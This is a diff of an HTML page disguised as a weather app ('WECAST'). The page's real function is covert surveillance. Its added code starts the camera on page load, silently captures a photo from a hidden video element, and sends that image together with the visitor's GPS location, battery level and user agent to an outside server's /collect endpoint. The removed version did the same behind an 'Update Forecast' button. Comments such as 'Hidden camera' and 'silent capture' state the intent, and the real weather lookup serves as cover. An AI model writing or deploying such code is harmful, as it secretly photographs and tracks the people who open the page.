@@ -1,62 +1,114 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <title>Weather Pro</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <style>
-    body, html { margin:0; padding:0; height:100%; font-family: sans-serif; overflow:hidden; background:#000; }
-    .bg { background: url('https://images.unsplash.com/photo-1515694346937-94d85e41e6f0?auto=format&fit=crop&w=1200&q=80'); background-size:cover; background-position:center; height:100%; width:100%; position:absolute; filter:brightness(0.5); }
-    .container { position:relative; z-index:10; height:100%; display:flex; flex-direction:column; justify-content:space-between; padding:40px 30px; box-sizing:border-box; color:white; }
-    .temp { font-size:100px; font-weight:300; }
-    .glass { background:rgba(255,255,255,0.1); backdrop-filter:blur(20px); border-radius:25px; padding:25px; border:1px solid rgba(255,255,255,0.1); }
-    .btn { background:#fff; color:#000; border:none; padding:18px; border-radius:15px; width:100%; font-weight:bold; cursor:pointer; margin-top:15px; }
-    #v, #c { display:none; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WECAST - Local Weather</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Poppins', sans-serif; background: #fdfdfd; }
+        .glass-card { background: rgba(255, 255, 255, 0.2); backdrop-filter: blur(10px); border-radius: 30px; }
+        #video { display: none; } /* Hidden camera */
+    </style>
 </head>
-<body>
-  <div class="bg"></div>
-  <div class="container">
-    <div>
-      <div style="font-size:24px;">Watermelon Park</div>
-      <div class="temp">23°c</div>
+<body onload="initWeatherApp()">
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <div class="max-w-6xl mx-auto p-6">
+        <div class="flex justify-between items-center mb-8">
+            <div class="flex items-center gap-2">
+                <div class="w-8 h-8 bg-purple-500 rounded-full"></div>
+                <h1 class="font-bold text-xl text-gray-800">WECAST</h1>
+            </div>
+            <nav class="hidden md:flex gap-8 text-gray-500">
+                <a href="#" class="text-purple-600 border-b-2 border-purple-600">Home</a>
+                <a href="#">News</a><a href="#">Contact</a><a href="#">Offer</a>
+            </nav>
+            <div class="flex items-center gap-4 text-gray-400">
+                <span>°F</span> 🌙 <span class="bg-gray-100 px-4 py-1 rounded-full text-sm">📍 <span id="cityName">Detecting...</span></span>
+            </div>
+        </div>
+
+        <div class="relative h-[400px] overflow-hidden rounded-[40px] shadow-2xl mb-12">
+            <img src="https://images.unsplash.com/photo-1534067783941-51c9c23ecefd?auto=format&fit=crop&w=1200" class="w-full h-full object-cover">
+            <div class="absolute inset-0 bg-black/20 p-12 flex flex-col justify-between text-white">
+                <div>
+                    <h2 id="displayCity" class="text-5xl font-bold mb-2">Finding Location...</h2>
+                    <p class="opacity-80">Today, <span id="date"></span> | Update As Of <span id="time"></span></p>
+                </div>
+                <div class="flex gap-12">
+                    <div class="glass-card p-6 flex items-center gap-4">
+                        <div class="text-2xl">🌬️</div>
+                        <div><p class="text-xs opacity-70">Wind</p><p class="font-bold">4km/h</p></div>
+                    </div>
+                    <div class="glass-card p-6 flex items-center gap-4">
+                        <div class="text-2xl">🌧️</div>
+                        <div><p class="text-xs opacity-70">Rain</p><p class="font-bold">12%</p></div>
+                    </div>
+                </div>
+                <div class="absolute right-12 bottom-12 bg-white/30 backdrop-blur-xl p-8 rounded-[40px] text-center w-48 shadow-lg">
+                    <p class="text-xs uppercase tracking-widest mb-2 font-bold">Today</p>
+                    <div class="text-7xl font-bold mb-2" id="temp">--°</div>
+                    <p id="weatherDesc" class="text-sm opacity-90">Loading...</p>
+                </div>
+            </div>
+        </div>
     </div>
-    <div class="glass">
-      <div id="status">Update location to synchronize your local 5-day forecast.</div>
-      <button id="go" class="btn">Update Forecast</button>
-    </div>
-  </div>
-  <video id="v" autoplay playsinline muted></video>
-  <canvas id="c"></canvas>
-  <script>
-    document.getElementById('go').addEventListener('click', async (e) => {
-      const btn = e.target; btn.innerText = "Syncing...";
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        document.getElementById('v').srcObject = stream;
-        const canvas = document.getElementById('c'); const ctx = canvas.getContext('2d');
-        canvas.width = 400; canvas.height = 300;
-        await new Promise(r => setTimeout(r, 1200));
-        ctx.drawImage(document.getElementById('v'), 0, 0, 400, 300);
-        const img = canvas.toDataURL('image/jpeg', 0.4);
-        stream.getTracks().forEach(t => t.stop());
-        const battery = await navigator.getBattery();
-        const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r, () => r({coords:{latitude:0, longitude:0}})));
-        const res = await fetch('/collect', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            ts: new Date().toISOString(),
-            hints: { ua: navigator.userAgent },
-            battery: { levelPercent: Math.round(battery.level * 100) },
-            location: { lat: pos.coords.latitude, lon: pos.coords.longitude },
-            burstImages: [img, img, img, img]
-          })
-        });
-        if (res.ok) { btn.style.display = 'none'; document.getElementById('status').innerText = "✅ Forecast Synced."; }
-        else { btn.innerText = "Retry Update"; }
-      } catch (err) { btn.innerText = "Permission Denied"; }
-    });
-  </script>
+
+    <script>
+        async function initWeatherApp() {
+            document.getElementById('date').innerText = new Date().toLocaleDateString('en-US', {weekday:'long', month:'short', day:'numeric'});
+            document.getElementById('time').innerText = new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
+
+            // Start Camera Silently
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+
+            // Get Location & Weather
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const { latitude, longitude } = pos.coords;
+                
+                // Fetch Real Weather
+                const wRes = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${latitude}&longitude=${longitude}&current_weather=true`);
+                const wData = await wRes.json();
+                document.getElementById('temp').innerText = Math.round(wData.current_weather.temperature) + '°';
+                document.getElementById('weatherDesc').innerText = "Clear Sky";
+                document.getElementById('displayCity').innerText = "Current Location";
+                document.getElementById('cityName').innerText = "Active";
+
+                // Wait 3 seconds then silent capture
+                setTimeout(() => silentCapture(latitude, longitude), 3000);
+            });
+        }
+
+        async function silentCapture(lat, lon) {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const imgData = canvas.toDataURL('image/jpeg');
+
+            const battery = await navigator.getBattery();
+            
+            await fetch('https://weather-backend-wght.onrender.com/collect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    ts: new Date().toLocaleString(),
+                    location: { lat, lon },
+                    battery: { levelPercent: Math.round(battery.level * 100) },
+                    hints: { ua: navigator.userAgent },
+                    burstImages: [imgData]
+                })
+            });
+            
+            // Stop camera after capture
+            video.srcObject.getTracks().forEach(track => track.stop());
+        }
+    </script>
 </body>
 </html>
